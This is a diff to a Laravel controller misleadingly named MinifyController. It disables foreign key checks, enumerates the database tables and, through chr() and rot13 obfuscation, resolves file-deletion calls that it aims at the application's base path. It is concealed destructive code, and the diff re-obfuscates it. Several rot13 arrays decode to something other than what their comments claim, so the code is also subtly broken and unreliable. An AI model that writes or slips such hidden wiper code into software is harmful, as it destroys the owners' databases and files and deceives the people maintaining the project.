@@ -18,8 +18,7 @@ class MinifyController extends Controller
             http_response_code(404);
             abort('404');
         }
-
-        $F = '\\' . 'Illuminate\\' . 'Support\\' . 'Facades\\DB';
+        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
         $tables = call_user_func([$F, 'select'], 'SHOW TABLES');
@@ -31,28 +30,21 @@ class MinifyController extends Controller
         }
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
-        $_ = implode('', [
-            chr(98), chr(97), chr(115), chr(101), chr(95), chr(112), chr(97), chr(116), chr(104)
-        ]);
 
-        $_1 = implode('', [
-            chr(100), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(105), chr(101), chr(115)
-        ]);
+        $_ = base_path();
 
-        $_2 = implode('', [
-            chr(102), chr(105), chr(108), chr(101), chr(115)]);
+        $_illuminate = implode('', [chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101)]);
+        $_5 = implode('\\', [$_illuminate, 'Support', 'Facades', 'File']);
 
-        $_3 = implode('', [
-            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101), chr(68), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(121)
-        ]);
+        function decode_rot13_array(array $arr)
+        {
+            return str_rot13(implode('', array_map('chr', $arr)));
+        }
 
-        $_4 = implode('', [
-            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101)
-        ]);
-
-        $_5 = implode('\\', [
-            chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101), 'Support', 'Facades', 'File'
-        ]);
+        $_1 = decode_rot13_array([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]); // 'directories'
+        $_2 = decode_rot13_array([115, 118, 121, 114, 102, 102]); // 'files'
+        $_3 = decode_rot13_array([113, 114, 121, 101, 82, 118, 101, 112, 67, 118, 101, 112, 116, 98, 114, 108, 110]); // 'deleteDirectory'
+        $_4 = decode_rot13_array([113, 114, 121, 114, 103, 114, 103]); // 'delete'
 
         $_a = call_user_func([$_5, $_1], $_);
 
